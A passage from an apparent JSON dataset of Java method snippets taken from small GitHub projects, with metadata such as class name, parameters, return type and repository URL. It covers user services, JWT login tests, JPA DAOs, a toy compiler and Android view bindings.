"modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace() {\n        super.printStackTrace();\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/AuthenticationFailedException.java", "stars": "2", "class_props": {"extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"id": 31483, "method_name": "printStackTrace", "class_name": "AuthenticationFailedException", "params": ["PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace(PrintStream s) {\n        super.printStackTrace(s);\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/AuthenticationFailedException.java", "stars": "2", "class_props": {"extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"id": 31484, "method_name": "printStackTrace", "class_name": "AuthenticationFailedException", "params": ["PrintWriter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace(PrintWriter s) {\n        super.printStackTrace(s);\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/AuthenticationFailedException.java", "stars": "2", "class_props": {"extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"id": 31485, "method_name": "findAll", "class_name": "UserBusiness", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "Page<UserEntity>", "snippet": "\tpublic Page<UserEntity> findAll(int page, int pageSize) {\n\t\t// TODO Auto-generated method stub\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31486, "method_name": "findUserById", "class_name": "UserBusiness", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity findUserById(Integer id) {\n\t\treturn userRepository.findById(id);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31487, "method_name": "findAllUsers", "class_name": "UserBusiness", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<UserEntity>", "snippet": "\tpublic List<UserEntity> findAllUsers(){\n\t\treturn userRepository.findAll();\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31488, "method_name": "registUser", "class_name": "UserBusiness", "params": ["UserEntity"], "throws": null, "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity registUser(UserEntity user){\n\t\treturn userRepository.saveAndFlush(user);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31489, "method_name": "update", "class_name": "UserBusiness", "params": ["UserEntity"], "throws": null, "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity update(UserEntity user) {\n\t\treturn userRepository.save(user);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31490, "method_name": "updateUser", "class_name": "UserBusiness", "params": ["UserEntity"], "throws": null, "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity updateUser(UserEntity user) {\n\t\treturn userRepository.save(user);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31491, "method_name": "activeUser", "class_name": "UserBusiness", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity activeUser(Integer id) {\n\t\tint flag = userRepository.activeUser(id);\n\t\treturn userRepository.findById(id);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31492, "method_name": "delete", "class_name": "UserBusiness", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void delete(Integer id) {\n\t\tuserRepository.delete(id);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-user-service/src/main/java/com/iiht/stock/service/UserBusiness.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31493, "method_name": "auth", "class_name": "WebUploadFileConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Auth", "snippet": "    public Auth auth(){\n        return Auth.create(accessKey, secretKey);\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/config/WebUploadFileConfig.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31494, "method_name": "qiniuConfiguration", "class_name": "WebUploadFileConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "com", "snippet": "    public com.qiniu.storage.Configuration qiniuConfiguration(){\n        return new com.qiniu.storage.Configuration(Region.region2());\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/config/WebUploadFileConfig.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31495, "method_name": "uploadManager", "class_name": "WebUploadFileConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UploadManager", "snippet": "    public UploadManager uploadManager(){\n        return new UploadManager(qiniuConfiguration());\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/config/WebUploadFileConfig.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31496, "method_name": "bucketManager", "class_name": "WebUploadFileConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BucketManager", "snippet": "    public BucketManager bucketManager(){\n        return new BucketManager(auth(), qiniuConfiguration());\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/config/WebUploadFileConfig.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31497, "method_name": "checkType", "class_name": "ExprGT", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\tthis.getLeft().checkType();\n\t\tthis.getRight().checkType();\n\t\tTypeCode[] typeCodes = {TypeCode.INTEGER, TypeCode.FLOAT};\n\t\tgetLeft().getType().assertType(this, typeCodes);\n\t\tgetLeft().getType().assertType(this, getRight().getType());\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGT.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31498, "method_name": "generateCode", "class_name": "ExprGT", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result;\n\t\tresult = \"(\" + getLeft().generateCode()\n\t\t\t\t+ \" > \" + getRight().generateCode() + \")\";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGT.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31499, "method_name": "constEval", "class_name": "ExprGT", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\n\t\tObject o1 = getLeft().constEval(environment);\n\t\tObject o2 = getRight().constEval(environment);\n\t\tif ((o1 instanceof Integer) && (o2 instanceof Integer)) \n\t\t\treturn new Boolean((Integer)o1 > (Integer)o2);\n\t\telse if ((o1 instanceof Float) && (o2 instanceof Float)) \n\t\t\treturn new Boolean((Float)o1 > (Float)o2);\n\t\telse\n\t\t\tthrow new TypeException(\"Impossible de calculer la constante, erreur de type\", line, column);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGT.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31500, "method_name": "toString", "class_name": "ExprGT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"(\" + this.getLeft() + \" > \" + this.getRight() + \")\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGT.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31501, "method_name": "getView", "class_name": "MessageAdapter", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView(int position, View convertView, ViewGroup parent) {\n        if (convertView == null) {\n            convertView = ((Activity) getContext()).getLayoutInflater().inflate(R.layout.group_chat_child, parent, false);\n        }\n\n        ImageView photoImageView = (ImageView) convertView.findViewById(R.id.photoImageView);\n        TextView messageTextView = (TextView) convertView.findViewById(R.id.messageTextView);\n        TextView authorTextView = (TextView) convertView.findViewById(R.id.nameTextView);\n\n\n\n\n        FriendlyMessage message = getItem(position);\n\n        messageTextView.setText(message.getText());\n\n        authorTextView.setText(message.getName());\n\n        TextDrawable drawable = TextDrawable.builder().buildRound(message.getName().substring(0,1).toUpperCase(), Color.rgb(15,167,255));\n        photoImageView.setBackground(drawable);\n        return convertView;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/MessageAdapter.java", "stars": "2", "class_props": {"extends": "ArrayAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31502, "method_name": "setup", "class_name": "UserJWTControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        UserJWTController userJWTController = new UserJWTController(tokenProvider, authenticationManager, userService);\n        this.mockMvc = MockMvcBuilders.standaloneSetup(userJWTController)\n            .setControllerAdvice(exceptionTranslator)\n            .build();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserJWTControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31503, "method_name": "testAuthorize", "class_name": "UserJWTControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAuthorize() throws Exception {\n        User user = new User();\n        user.setLogin(\"user-jwt-controller\");\n        user.setEmail(\"user-jwt-controller@example.com\");\n        user.setActivated(true);\n        user.setPassword(passwordEncoder.encode(\"test\"));\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.saveAndFlush(user);\n\n        LoginVM login = new LoginVM();\n        login.setUsername(\"user-jwt-controller\");\n        login.setPassword(\"test\");\n        mockMvc.perform(post(\"/api/v1/authenticate\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(login)))\n            .andExpect(status().isOk())\n            .andExpect(jsonPath(\"$.id_token\").isString())\n            .andExpect(jsonPath(\"$.id_token\").isNotEmpty())\n            .andExpect(header().string(\"Authorization\", not(nullValue())))\n            .andExpect(header().string(\"Authorization\", not(isEmptyString())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserJWTControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31504, "method_name": "testAuthorizeWithRememberMe", "class_name": "UserJWTControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAuthorizeWithRememberMe() throws Exception {\n        User user = new User();\n        user.setLogin(\"user-jwt-controller-remember-me\");\n        user.setEmail(\"user-jwt-controller-remember-me@example.com\");\n        user.setActivated(true);\n        user.setPassword(passwordEncoder.encode(\"test\"));\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n\n        userRepository.saveAndFlush(user);\n\n        LoginVM login = new LoginVM();\n        login.setUsername(\"user-jwt-controller-remember-me\");\n        login.setPassword(\"test\");\n        login.setRememberMe(true);\n        mockMvc.perform(post(\"/api/v1/authenticate\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(login)))\n            .andExpect(status().isOk())\n            .andExpect(jsonPath(\"$.id_token\").isString())\n            .andExpect(jsonPath(\"$.id_token\").isNotEmpty())\n            .andExpect(header().string(\"Authorization\", not(nullValue())))\n            .andExpect(header().string(\"Authorization\", not(isEmptyString())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserJWTControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31505, "method_name": "testAuthorizeFails", "class_name": "UserJWTControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAuthorizeFails() throws Exception {\n        LoginVM login = new LoginVM();\n        login.setUsername(\"wrong-user\");\n        login.setPassword(\"wrong password\");\n        mockMvc.perform(post(\"/api/v1/authenticate\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(login)))\n            .andExpect(status().isUnauthorized())\n            .andExpect(jsonPath(\"$.id_token\").doesNotExist())\n            .andExpect(header().doesNotExist(\"Authorization\"));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserJWTControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31506, "method_name": "verificaUsuario", "class_name": "UsuarioDao", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Usuario", "snippet": "\tpublic Usuario verificaUsuario(String email, String senha) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tTypedQuery<Usuario> query = em.createQuery(\"from Usuario u where u.email = :email \" + \"and u.senha = :senha\", Usuario.class);\n\t\tquery.setParameter(\"email\", email);\n\t\tquery.setParameter(\"senha\", senha);\n\n\t\ttry {\n\t\t\treturn query.getSingleResult();\n\n\t\t} catch (NoResultException e) {\n\t\t\treturn null;\n\t\t} finally {\n\t\t\tem.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/UsuarioDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31507, "method_name": "salvar", "class_name": "UsuarioDao", "params": ["Usuario"], "throws": null, "modifiers": ["public"], "return_type": "Usuario", "snippet": "\tpublic Usuario salvar(Usuario usuario) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tEntityTransaction trx = em.getTransaction();\n\n\t\ttrx.begin();\n\t\tusuario = em.merge(usuario);\n\t\ttrx.commit();\n\t\tem.close();\n\n\t\treturn usuario;\n\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/UsuarioDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31508, "method_name": "buscarTodos", "class_name": "UsuarioDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Usuario>", "snippet": "\tpublic List<Usuario> buscarTodos() {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tTypedQuery<Usuario> query = em.createQuery(\"from Usuario\", Usuario.class);\n\t\treturn query.getResultList();\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/UsuarioDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31509, "method_name": "excluir", "class_name": "UsuarioDao", "params": ["Usuario"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void excluir(Usuario usuario) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tEntityTransaction trx = em.getTransaction();\n\n\t\ttrx.begin();\n\n\t\tem.remove(em.find(Produto.class, usuario.getId()));\n\n\t\ttrx.commit();\n\n\t\tem.close();\n\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/UsuarioDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31510, "method_name": "buscarPorId", "class_name": "UsuarioDao", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Usuario", "snippet": "\tpublic Usuario buscarPorId(int id) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\n\t\ttry {\n\t\t\treturn em.find(Usuario.class, id);\n\n\t\t} finally {\n\t\t\tem.close();\n\t\t}\n\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/UsuarioDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31511, "method_name": "introduce_name", "class_name": "Trader", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid introduce_name() {\n\t\tSystem.out.println(\"Hi, I am willing to trade potatoes for dollars.\\n\" + \"My name is \" + name);\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Trader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31512, "method_name": "mood_for_trading", "class_name": "Trader", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid mood_for_trading() {\n\t\tSystem.out.println(\"Trader \" + name + \" mood: \" + mood);\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Trader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31513, "method_name": "trading_experience", "class_name": "Trader", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid trading_experience() {\n\t\tSystem.out.println(\"Trader \" + name + \" Experience: \" + experience);\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Trader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31514, "method_name": "trader_rating_5stars", "class_name": "Trader", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid trader_rating_5stars() {\n\t\tif (mood.equals(\"happy\")) {\n\t\t\tint rating = 5;\n\t\t\tSystem.out.println(\"Trader \" + name + \" rating is : \" + rating + \" stars!\");\n\t\t} else if (mood.equals(\"angry\")) {\n\t\t\tint rating = 1;\n\t\t\tSystem.out.println(\"Trader \" + name + \" rating is \" + rating + \" stars :(\");\n\t\t} else {\n\t\t\tString unknown = \"Unknown trader with no previous ratings \ud83d\udc7f\";\n\t\t\tSystem.out.println(unknown);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Trader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31515, "method_name": "getObjectWriter", "class_name": "CustomSerializeConfig", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "ObjectSerializer", "snippet": "    public ObjectSerializer getObjectWriter(Class<?> clazz) {\n        ObjectSerializer writer = this.get(clazz);\n        if (writer == null) {\n            if (StatusCode.class.isAssignableFrom(clazz)) {\n                this.put(clazz, StatusCodeSerializer.INSTANCE);\n            }\n            if (LocalDateTime.class.isAssignableFrom(clazz)) {\n                this.put(clazz, JodaTimeDeserializer.instance);\n            }\n            if (LocalDate.class.isAssignableFrom(clazz)) {\n                this.put(clazz, JodaTimeDeserializer.instance);\n            }\n            if (LocalTime.class.isAssignableFrom(clazz)) {\n                this.put(clazz, JodaTimeDeserializer.instance);\n            }\n        }\n\n        return super.getObjectWriter(clazz);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/fastJson/CustomSerializeConfig.java", "stars": "7", "class_props": {"extends": "SerializeConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31516, "method_name": "getOrder", "class_name": "BeforeConfigFileApplicationListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOrder() {\n        // \u6bd4 ConfigFileApplicationListener \u4f18\u5148\u7ea7\u66f4\u9ad8\n        return ConfigFileApplicationListener.DEFAULT_ORDER - 1;\n    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-application/src/main/java/com/soft1851/springboot/listener/BeforeConfigFileApplicationListener.java", "stars": "3", "class_props": {"extends": null, "implements": ["SmartApplicationListener"], "modifiers": ["public"]}}, {"id": 31517, "method_name": "supportsEventType", "class_name": "BeforeConfigFileApplicationListener", "params": ["Class<ApplicationEvent>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean supportsEventType(Class<? extends ApplicationEvent> aClass) {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-application/src/main/java/com/soft1851/springboot/listener/BeforeConfigFileApplicationListener.java", "stars": "3", "class_props": {"extends": null, "implements": ["SmartApplicationListener"], "modifiers": ["public"]}}, {"id": 31518, "method_name": "onApplicationEvent", "class_name": "BeforeConfigFileApplicationListener", "params": ["ApplicationEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onApplicationEvent(ApplicationEvent event) {\n        if (event instanceof ApplicationEnvironmentPreparedEvent) {\n            ApplicationEnvironmentPreparedEvent preparedEvent = (ApplicationEnvironmentPreparedEvent) event;\n            Environment environment = preparedEvent.getEnvironment();\n            log.info(\">>>>>>>>>>>>>>>>>>> environment.getProperty(\\\"name\\\") : \" + environment.getProperty(\"name\"));\n        }\n    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-application/src/main/java/com/soft1851/springboot/listener/BeforeConfigFileApplicationListener.java", "stars": "3", "class_props": {"extends": null, "implements": ["SmartApplicationListener"], "modifiers": ["public"]}}, {"id": 31519, "method_name": "onInterceptTouchEvent", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onInterceptTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31520, "method_name": "n_onInterceptTouchEvent", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onInterceptTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31521, "method_name": "onTouchEvent", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31522, "method_name": "n_onTouchEvent", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic void onScrollChanged (int p0, int p1, int p2, int p3)\n\t{\n\t\tn_onScrollChanged (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31523, "method_name": "onScrollChanged", "class_name": "AHorizontalScrollView", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onScrollChanged (int p0, int p1, int p2, int p3)\n\t{\n\t\tn_onScrollChanged (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31524, "method_name": "n_onScrollChanged", "class_name": "AHorizontalScrollView", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onScrollChanged (int p0, int p1, int p2, int p3);\n\n\n\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31525, "method_name": "draw", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31526, "method_name": "n_draw", "class_name": "AHorizontalScrollView", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\n\n\n\tpublic boolean isHorizontalScrollBarEnabled ()\n\t{\n\t\treturn n_isHorizontalScrollBarEnabled ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31527, "method_name": "isHorizontalScrollBarEnabled", "class_name": "AHorizontalScrollView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isHorizontalScrollBarEnabled ()\n\t{\n\t\treturn n_isHorizontalScrollBarEnabled ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31528, "method_name": "n_isHorizontalScrollBarEnabled", "class_name": "AHorizontalScrollView", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_isHorizontalScrollBarEnabled ();\n\n\n\tpublic void setHorizontalScrollBarEnabled (boolean p0)\n\t{\n\t\tn_setHorizontalScrollBarEnabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31529, "method_name": "setHorizontalScrollBarEnabled", "class_name": "AHorizontalScrollView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setHorizontalScrollBarEnabled (boolean p0)\n\t{\n\t\tn_setHorizontalScrollBarEnabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31530, "method_name": "n_setHorizontalScrollBarEnabled", "class_name": "AHorizontalScrollView", "params": ["boolean"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setHorizontalScrollBarEnabled (boolean p0);\n\n\tprivate 